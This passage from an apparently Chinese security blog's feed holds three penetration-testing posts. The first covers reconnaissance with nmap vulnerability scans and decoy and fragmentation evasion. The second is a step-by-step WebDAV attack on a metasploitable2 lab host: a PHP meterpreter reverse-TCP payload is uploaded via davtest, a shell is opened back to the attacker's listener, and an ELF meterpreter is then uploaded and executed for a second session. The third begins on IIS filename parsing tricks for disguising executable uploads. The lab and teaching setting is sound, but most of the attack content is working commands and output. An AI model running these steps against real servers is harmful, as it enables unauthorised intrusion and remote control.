target</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target</span><br><span class="line">nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target</span><br><span class="line">nmap -sV --script=vuln target</span><br><span class="line">nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target</span><br></pre></td></tr></table></figure><ul><li>利用nmap进行端口扫描</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  Nmap Ports Scan</span><br><span class="line">1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)</span><br><span class="line">1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)</span><br><span class="line">2)fargement</span><br><span class="line">3)data packed – like orginal one not scan packet</span><br><span class="line">4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target</span><br><span class="line">5)nmap –source-port 53 target</span><br><span class="line">nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)</span><br><span class="line">nmap -Pn -T2 -sV –randomize-hosts IP1,IP2</span><br><span class="line">nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)</span><br><span class="line">nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)</span><br><span class="line">nmap -sA -PN -sN target</span><br><span class="line">nmap -sS -sV -T5 -F -A -O target (version detection)</span><br><span class="line">nmap -sU -v target (Udp)</span><br><span class="line">nmap -sU -P0 (Udp)</span><br><span class="line">nmap -sC 192.168.31.10-12 (all scan default)</span><br></pre></td></tr></table></figure><ul><li><a href="http://docs.ioin.in/writeup/blog.heysec.org/_archives_577/index.html" target="_blank" rel="noopener">端口渗透总结</a></li><li><a href="http://airs-sec.com/2017/04/10/nmap%E6%9C%80%E4%BD%B3%E6%89%AB%E6%8F%8F%E7%AD%96%E7%95%A5/">nmap最佳扫描策略</a></li></ul></li></ul></li></ul><hr><ul><li><p>其他</p><ul><li>敏感文件或目录</li></ul><blockquote><p>可以利用一些小工具扫描网站上是否存在敏感信息，常见的工具有：御剑。kali下则有<a href="http://sectools.org/tool/nikto/" target="_blank" rel="noopener">nikto</a>。</p></blockquote><blockquote><p>当然，一些敏感文件也可以通过常见的漏洞扫描器也可以发现，在找敏感文件或目录的时候，可以加载自己制作的文件/目录字典进行扫描，有针对性的去寻找。</p></blockquote><blockquote><p>这里提供一份字典文件，字典文件涉及的东西好多（用户名、密码、sqli测试、xss测试、敏感目录等等），都是从互联网上收集的。<br><code>链接：https://pan.baidu.com/s/1skY9Jv3 密码：jgel</code></p></blockquote><ul><li><p>御剑系列：<code>链接：https://pan.baidu.com/s/1nuAvvXR 密码：ozsg</code></p></li><li><p>web指纹识别</p><ul><li><p><a href="https://www.whatweb.net/" target="_blank" rel="noopener">whatweb</a> - whatweb是web指纹识别工具，包括cms、blog平台、统计/分析包、js库、web服务器指纹、嵌入式设备。WhatWeb拥有超过1000个插件，每个都可以识别不同的东西。WhatWeb还可识别版本号，电子邮件地址，帐户ID，Web框架模块，SQL错误等。</p><ul><li>用法：<code>whatweb target.com</code></li></ul></li><li><p>御剑web指纹识别工具-<code>链接：https://pan.baidu.com/s/1hsnLhQG 密码：jots</code></p></li><li><p><a href="http://whatweb.bugscaner.com" target="_blank" rel="noopener">Bugscaner</a></p></li><li><code>nmap -sV example.com</code></li><li><code>robots.txt</code>文件-通过浏览器进行测试。<a href="http://www.test.com/robots.txt" target="_blank" rel="noopener">http://www.test.com/robots.txt</a></li><li>审查元素-通过浏览器对网页的元素进行审查，google浏览器通过F12进行打开，建议使用firefox的firebug工具进行元素的审查。</li></ul></li></ul></li></ul><hr><ul><li><p>利用浏览器进行信息收集,熟练使用搜索语法</p><ul><li><a href="https://www.google.com/" target="_blank" rel="noopener">google</a><ul><li><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">Google GHDB</a></li><li><a href="https://www.ytyzx.org/index.php?title=%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Google%EF%BC%88%E8%B0%B7%E6%AD%8C%EF%BC%89%E8%BF%9B%E8%A1%8C%E9%AB%98%E6%95%88%E7%8E%87%E6%90%9C%E7%B4%A2" target="_blank" rel="noopener">如何使用Google（谷歌）进行高效率搜索</a></li><li><a href="https://www.zhihu.com/question/20161362" target="_blank" rel="noopener">如何用好谷歌等搜索引擎？</a></li></ul></li><li><a href="https://www.baidu.com" target="_blank" rel="noopener">百度</a></li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a><ul><li><a href="https://www.defcon.org/images/defcon-18/dc-18-presentations/Schearer/DEFCON-18-Schearer-SHODAN.pdf" target="_blank" rel="noopener">shodan使用指南</a></li><li><a href="https://leanpub.com/shodan" target="_blank" rel="noopener">Complete Guide to Shodan</a>-<code>链接：https://pan.baidu.com/s/1bpyeKqV 密码：3cwk</code></li></ul></li><li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">zoomeye</a><ul><li><a href="https://www.zoomeye.org/help" target="_blank" rel="noopener">zoomeye帮助手册</a></li></ul></li></ul></li><li><p>辅助工具</p><ul><li><a href="http://tool.oschina.net/" target="_blank" rel="noopener">http://tool.oschina.net/</a></li><li><a href="https://tool.lu/" target="_blank" rel="noopener">https://tool.lu/</a></li><li><a href="http://www.yopmail.com/zh/" target="_blank" rel="noopener">临时邮箱</a></li><li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">exploit-db</a></li></ul></li><li>辅助资料<ul><li><a href="https://www.processon.com/view/583e8834e4b08e31357bb727" target="_blank" rel="noopener">渗透标准</a></li></ul></li></ul><p>参考：</p><p><a href="http://www.cnnetarmy.com/%E4%B9%99%E6%96%B9%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" target="_blank" rel="noopener">乙方渗透测试之信息收集</a></p><p><a href="https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/#msf-payloads" target="_blank" rel="noopener">EK</a></p><p><a href="https://www.owasp.org/index.php/Testing:_Information_Gathering" target="_blank" rel="noopener">Testing:_Information_Gathering</a></p><p><a href="https://github.com/jivoi/awesome-osint" target="_blank" rel="noopener">Awesome OSINT</a></p><hr><p>[首页图来自wallhaven.cc][5]</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web安全信息收集&quot;&gt;&lt;a href=&quot;#web安全信息收集&quot; class=&quot;headerlink&quot; title=&quot;web安全信息收集&quot;&gt;&lt;/a&gt;web安全信息收集&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/1515035737450.jpg&quot; alt=&quot;web安全信息收集&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://airs-sec.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="web信息收集" scheme="http://airs-sec.com/tags/web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>危险的http请求方法webdav-metasploit获取session</title>
    <link href="http://airs-sec.com/2017/12/18/%E5%8D%B1%E9%99%A9%E7%9A%84http%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95webdav-metasploit%E8%8E%B7%E5%8F%96session/"/>
    <id>http://airs-sec.com/2017/12/18/危险的http请求方法webdav-metasploit获取session/</id>
    <published>2017-12-18T02:47:04.000Z</published>
    <updated>2017-12-18T03:51:48.606Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513569024727.jpg" alt="危险的http请求方法"></p><a id="more"></a><h1 id="HTTP请求方法简介"><a href="#HTTP请求方法简介" class="headerlink" title="HTTP请求方法简介"></a>HTTP请求方法简介</h1><p>HTTP/1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源：</p><p><strong>OPTIONS：</strong>这个方法可使服务器传回该资源所支持的所有HTTP请求方法。<code>用&#39;*&#39;来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。</code></p><p><strong>HEAD：</strong>与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。</p><p><strong>GET：</strong>向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。</p><p><strong>POST：</strong>向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。</p><p><strong>PUT：</strong>向指定资源位置上传其最新内容。</p><p><strong>DELETE：</strong>请求服务器删除Request-URI所标识的资源。</p><p><strong>TRACE：</strong>回显服务器收到的请求，主要用于测试或诊断。</p><p><strong>CONNECT：</strong>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。</p><blockquote><p>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。</p></blockquote><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>web服务器默认是不开启PUT等方法的，出现该漏洞的原因主要是网站管理员对服务器的错误配置。常见的主要就是管理员错误地打开了IIS的服务器的webDAV而且没有开启权限验证，导致可以PUT文件到服务器再利用服务器的解析漏洞运行恶意代码或者用webDAV的MOVE方法将所上传的带有恶意代码的普通文件后缀修改为可执行文件后缀，运行恶意代码。</p><p>若服务器开始了DELETE方法，是可以利用其删除网站上文件的，但是实际案例极少，而且开启了DELETE方法的服务器一般也会开始PUT方法，与PUT方法的危害相比，DELETE方法的危害显然要小得多。</p><h2 id="burpsuite抓包上传"><a href="#burpsuite抓包上传" class="headerlink" title="burpsuite抓包上传"></a>burpsuite抓包上传</h2><p>通过burpsuite改变请求方法获取服务器开启的请求方法</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513566205639.jpg" alt="1"></p><ol start="2"><li><p>利用PUT方法将文件上传到服务器上。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513566254484.jpg" alt="2"></p></li></ol><p> 3.上传成功后，可以通过MOVE请求方法，将txt文本move成可执行脚本</p><p> 4.浏览器验证</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513566339195.jpg" alt="3"></p><h2 id="利用davtest上传文件至dav目录"><a href="#利用davtest上传文件至dav目录" class="headerlink" title="利用davtest上传文件至dav目录"></a>利用davtest上传文件至dav目录</h2><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513566391714.jpg" alt="4"></p><p>上传成功。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513566408438.jpg" alt="5"></p><h2 id="Metasploit通过webdava方法获取session"><a href="#Metasploit通过webdava方法获取session" class="headerlink" title="Metasploit通过webdava方法获取session"></a>Metasploit通过webdava方法获取session</h2><p><strong>环境：</strong></p><p><code>kali</code></p><p><code>metasploitable2</code></p><p>1、查看攻击机kali的ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">查看本地ip地址</span><br><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; ifconfig</span><br><span class="line">[*] exec: ifconfig</span><br><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0c:29:4b:99:df  </span><br><span class="line">          inet addr:192.168.179.128  Bcast:192.168.179.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fe4b:99df/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:4274321 errors:5690 dropped:278 overruns:0 frame:0</span><br><span class="line">          TX packets:12392315 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:448370315 (427.5 MiB)  TX bytes:769015699 (733.3 MiB)</span><br><span class="line">          Interrupt:19 Base address:0x2000 </span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:4589317 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:4589317 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:480528935 (458.2 MiB)  TX bytes:480528935 (458.2 MiB)</span><br></pre></td></tr></table></figure><p>2、开启metasploit</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/http/webdav_website_content</span><br><span class="line">msf auxiliary(webdav_website_content) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/http/webdav_website_content):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   PATH     /                yes       Path to use</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                    yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT    80               yes       The target port</span><br><span class="line">   THREADS  1                yes       The number of concurrent threads</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf auxiliary(webdav_website_content) &gt; setg RHOST 192.168.179.129</span><br><span class="line">RHOST =&gt; 192.168.179.129</span><br><span class="line">msf auxiliary(webdav_website_content) &gt; set PATH /dav/</span><br><span class="line">PATH =&gt; /dav/</span><br><span class="line">msf auxiliary(webdav_website_content) &gt; use payload/php/meterpreter/reverse_tcp</span><br><span class="line">msf payload(reverse_tcp) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (payload/php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">   </span><br><span class="line">msf payload(reverse_tcp) &gt; set LHOST 192.168.179.128</span><br><span class="line">LHOST =&gt; 192.168.179.128</span><br><span class="line">msf payload(reverse_tcp) &gt; set LPORT 4321</span><br><span class="line">LPORT =&gt; 4321</span><br><span class="line">msf payload(reverse_tcp) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (payload/php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.179.128  yes       The listen address</span><br><span class="line">   LPORT  4321             yes       The listen port</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 生成攻击脚本</span></span><br><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; generate -t raw -f testmeter.php</span><br><span class="line">[*] Writing 951 bytes to testmeter.php...</span><br></pre></td></tr></table></figure><p>3、kaili开启监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; use multi/handler</span><br><span class="line">msf exploit(handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt;</span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.179.128</span><br><span class="line">LHOST =&gt; 192.168.179.128</span><br><span class="line">msf exploit(handler) &gt; set LPORT 4321</span><br><span class="line">LPORT =&gt; 4321</span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; run -j</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.179.128:4321 </span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure><p>4、攻击主机上传php脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# davtest -url http://192.168.179.129/dav/ -uploadfile testmeter.php -uploadloc /DavTestDir_I3DjsKO5fx/testmeter.php</span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPENSUCCEED:http://192.168.179.129/dav</span><br><span class="line">********************************************************</span><br><span class="line"> unless  Uploading file</span><br><span class="line">Upload succeeded: http://192.168.179.129/dav//DavTestDir_I3DjsKO5fx/testmeter.php</span><br></pre></td></tr></table></figure><p>5、上传成功并点击可执行脚本获取session会话。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513567102783.jpg" alt="6"></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513567117889.jpg" alt="sysinfo"></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513567129358.jpg" alt="shell"></p><h2 id="升级权限"><a href="#升级权限" class="headerlink" title="升级权限"></a>升级权限</h2><p>1、生成可以执行的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; use payload/linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf payload(reverse_tcp) &gt;</span><br><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (payload/linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting  Required  Description</span><br><span class="line">   ----          ---------------  --------  -----------</span><br><span class="line">   DebugOptions  0                no        Debugging options for POSIX meterpreter</span><br><span class="line">   LHOST                          yes       The listen address</span><br><span class="line">   LPORT         4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; set LPORT 8888</span><br><span class="line">LPORT =&gt; 8888</span><br><span class="line">msf payload(reverse_tcp) &gt; setg LHOST 192.168.179.128</span><br><span class="line">LHOST =&gt; 192.168.179.128</span><br><span class="line">msf payload(reverse_tcp) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (payload/linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting  Required  Description</span><br><span class="line">   ----          ---------------  --------  -----------</span><br><span class="line">   DebugOptions  0                no        Debugging options for POSIX meterpreter</span><br><span class="line">   LHOST         192.168.179.128  yes       The listen address</span><br><span class="line">   LPORT         8888             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; generate -t elf -f meter.elf</span><br><span class="line">[*] Writing 155 bytes to meter.elf...</span><br><span class="line">msf payload(reverse_tcp) &gt;</span><br></pre></td></tr></table></figure><p>2、开启监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; use multi/handler</span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting  Required  Description</span><br><span class="line">   ----          ---------------  --------  -----------</span><br><span class="line">   DebugOptions  0                no        Debugging options for POSIX meterpreter</span><br><span class="line">   LHOST         192.168.179.128  yes       The listen address</span><br><span class="line">   LPORT         4321             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; set LPORT 8888</span><br><span class="line">LPORT =&gt; 8888</span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.179.128:8888 </span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513567487701.jpg" alt="9"></p><p>3、通过sessions –I 1的upload命令上传meter.elf文件，从而获取到更高权限</p><p><code>upload meter.elf 上传文件</code></p><p>4、在sessions -l 1下执行shell,并执行攻击脚本，获取sessions</p><blockquote><p>shell</p></blockquote><blockquote><p>chmod +x meter.elf</p></blockquote><blockquote><p>execute –f meter.elf </p></blockquote><p>5、sessions –l,此时就有两个sessions了</p><hr><p>去年做实验总结的一篇文章，现在看时，感觉不像自己写的，但验证结果是自己做的的确没错。<code>-_-|</code></p><p>所以就发表出来了。</p><p>漏洞简介和原理是来自安全社区<code>http://www.loner.fm</code>的<code>wiki</code>，<code>wiki</code>已经访问不了了。</p><p><a href="http://obgutsg63.bkt.clouddn.com/blog/1513566391714.jpg" target="_blank" rel="noopener">首页图来自wallhaven.cc</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/1513569024727.jpg&quot; alt=&quot;危险的http请求方法&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://airs-sec.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>web安全剖析-第六章-文件上传</title>
    <link href="http://airs-sec.com/2017/12/15/web%E5%AE%89%E5%85%A8%E5%89%96%E6%9E%90-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://airs-sec.com/2017/12/15/web安全剖析-第六章-文件上传/</id>
    <published>2017-12-15T09:06:02.000Z</published>
    <updated>2017-12-15T09:13:17.732Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/6b695b58a8c141161d5b9d9c39259579_r.jpg" alt="enter description here" title="文件上传"></p><a id="more"></a><h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><p><strong>iis解析漏洞存在两种情况：</strong></p><p>1、目录解析漏洞</p><p>当建立<code>*.asp</code>的目录时，放在这个目录下的任意文件都当作asp文件来执行。</p><p><code>/xx.asp/xx.jpg</code></p><p>2、文件后缀解析漏洞</p><p>建立一个文件为<code>*.asp;.1.jpg</code>文件时，可以当作asp文件来执行。</p><p><code>wooyun.asp;.jpg</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/wooyun.asa</span><br><span class="line">/wooyun.cer</span><br><span 